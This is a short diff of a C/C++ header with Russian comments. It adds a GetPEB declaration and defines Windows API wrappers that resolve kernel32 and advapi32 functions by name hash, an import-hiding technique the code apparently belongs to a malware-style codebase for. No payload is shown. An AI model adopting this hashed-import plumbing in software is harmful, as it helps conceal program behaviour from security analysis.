@@ -59,6 +59,11 @@ enum TDllId
 PCHAR GetDLLName(TDllId ID);
 
 //--------------------------------------------------
+//  GetPEB - Функция возвращает адрес структуры PEB
+//--------------------------------------------------
+LPVOID GetPEB();
+
+//--------------------------------------------------
 //  GetImageBase - Функция возвращает базовый
 //                 адрес загруженного образа
 //  ProcAddr - Адрес функции с которого начинается
@@ -77,7 +82,7 @@ HMODULE GetKernel32();
 LPVOID GetProcAddressEx( char *Dll, DWORD dwModule, DWORD dwProcNameHash);
 LPVOID GetProcAddressEx2( char *Dll, DWORD dwModule, DWORD dwProcNameHash, int CacheIndex);
 
-DWORD pGetLastError();
+//DWORD pGetLastError();
 
 
 template <DWORD h, DWORD hash, int CacheIndex>
@@ -422,6 +427,9 @@ const static int ApiCacheSize = 555;
 #define pGetExitCodeProcess			pushargEx< DLL_KERNEL32, 0xFDC94385, 193 >
 #define pFlushFileBuffers			pushargEx< DLL_KERNEL32, 0x2f2feeda, 194 >	
 #define pGetStartupInfoA			pushargEx< DLL_KERNEL32, 0x407A1C6A, 195 >
+#define _pGetLastError    			pushargEx< DLL_KERNEL32, 0x1297812C, 0 >
+
+
 
 //advapi32
 #define pCreateProcessAsUserA		pushargEx< DLL_ADVAPI32, 0x985267C4, 196 >
@@ -847,6 +855,11 @@ const static int ApiCacheSize = 555;
 
 #define Min(a,b) (((a) < (b)) ? (a) : (b))
 #define Max(a,b) (((a) > (b)) ? (a) : (b))
+
+
+
+
+DWORD inline pGetLastError() { return (DWORD)_pGetLastError(); }
 
 
 //****************************************************************
